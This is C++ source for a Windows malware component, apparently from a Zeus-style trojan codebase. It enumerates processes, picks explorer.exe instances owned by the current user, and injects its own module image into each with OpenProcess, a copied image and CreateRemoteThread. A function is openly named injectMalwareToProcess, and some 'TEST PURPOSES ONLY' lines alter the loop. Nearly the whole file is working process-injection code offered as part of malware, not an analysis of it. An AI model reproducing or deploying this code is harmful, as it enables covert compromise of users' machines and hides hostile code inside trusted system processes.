#include<WinSock2.h>
#include<WTypes.h>
#include<TlHelp32.h>
#include<WinInet.h>

#include"defines.h"
#include"defines.h"
#include"process.h"
#include"core.h"
#include"str.h"
#include"mem.h"
#include"peimage.h"

static bool injectMalwareToProcess(DWORD pid, HANDLE processMutex, DWORD proccessFlags);
bool _injectToAll(void);

void WINAPI _entryPoint(void)
{

	bool ok=false;
	ok=Core::init(0);

	if(ok)
		_injectToAll();

	CWA(kernel32, ExitProcess)(ok ? 0 : 1);
}

bool _injectToAll(void)
{
	bool ok = false;

	//Looking processes as long as there are not infected.
	LPDWORD injectedPids    = NULL;
	DWORD injectedPidsCount = 0;
	DWORD newProcesses;

	do
	{
		HANDLE snap = CWA(kernel32, CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, 0);  
		newProcesses = 0;

		if(snap != INVALID_HANDLE_VALUE)
		{
			PROCESSENTRY32W pe;
			pe.dwSize = sizeof(PROCESSENTRY32W);

			if(CWA(kernel32, Process32FirstW)(snap, &pe))
      {
				do
			  {
          ok=true; // TEST PURPOSES ONLY
          if(Str::_findSubStringW(pe.szExeFile,L"explorer"))
          {
				    if(pe.th32ProcessID > 0 && pe.th32ProcessID != coreData.pid)
				    {
					    TOKEN_USER *tu;
					    DWORD sessionId;
					    DWORD sidLength;

					    //Check whether the ID already exists in the list.
					    for(DWORD i = 0; i < injectedPidsCount; i++)if(injectedPids[i] == pe.th32ProcessID)goto SKIP_INJECT;

					    HANDLE mutexOfProcess = Core::createMutexOfProcess(pe.th32ProcessID);
					    if(mutexOfProcess == NULL)goto SKIP_INJECT;

					    //We obtain the SID process and compare it with the SID current process.
					    if((tu = Process::_getUserByProcessId(pe.th32ProcessID, &sessionId)) != NULL)
					    {
						    if(sessionId == coreData.currentUser.sessionId &&
							    (sidLength = CWA(advapi32, GetLengthSid)(tu->User.Sid)) == coreData.currentUser.sidLength &&
							    Mem::_compare(tu->User.Sid, coreData.currentUser.token->User.Sid, sidLength) == 0)
						    {
							    //SID's are equal.
							    if(Mem::reallocEx(&injectedPids, (injectedPidsCount + 1) * sizeof(DWORD)))
							    {
								    injectedPids[injectedPidsCount++] = pe.th32ProcessID;
								    newProcesses++;

								    if(injectMalwareToProcess(pe.th32ProcessID, mutexOfProcess, 0))ok = true;
								    ok=false; newProcesses=0;//TEST PURPOSES ONLY

								    //goto END;
							    }
						    }
						    Mem::free(tu);
					    }

					    CWA(kernel32, CloseHandle)(mutexOfProcess);

    SKIP_INJECT:;
				    }
          }
			  }
			  while(ok && CWA(kernel32, Process32NextW)(snap, &pe) );
      }
			CWA(kernel32, CloseHandle)(snap);
		}
	}
	while(newProcesses != 0);

	Mem::free(injectedPids);

	return ok;
}

static bool injectMalwareToProcess(DWORD pid, HANDLE processMutex, DWORD proccessFlags)
{
	bool ok = false;
	HANDLE process = CWA(kernel32, OpenProcess)(PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION |
		PROCESS_VM_WRITE |
		PROCESS_VM_READ |
		PROCESS_CREATE_THREAD |
		PROCESS_DUP_HANDLE,
		FALSE, pid);

	if(process != NULL)
	{
		{
			void *newImage = Core::initNewModule(process, processMutex, proccessFlags);
			if(newImage != NULL)
			{
				// calculate routine that will be called by the new thread created
				LPTHREAD_START_ROUTINE proc = (LPTHREAD_START_ROUTINE)((LPBYTE)newImage + (DWORD_PTR)((LPBYTE)Core::_injectEntryForThreadEntry - (LPBYTE)coreData.modules.current));

				HANDLE thread = CWA(kernel32, CreateRemoteThread)(process, NULL, 0, proc, NULL, 0, NULL);
				if(thread != NULL)
				{
					if(CWA(kernel32, WaitForSingleObject)(thread, 10 * 1000) == WAIT_OBJECT_0)
					{
						ok = true;
						if( CWA(kernel32, ResumeThread)( thread ) == (DWORD)-1 ){
							ok=false;
						}
					}
					CWA(kernel32, CloseHandle)(thread);
				}

				if(!ok)
					CWA(kernel32, VirtualFreeEx)(process, newImage, 0, MEM_RELEASE);
			}
		}

		CWA(kernel32, CloseHandle)(process);
	}

	return ok;
}
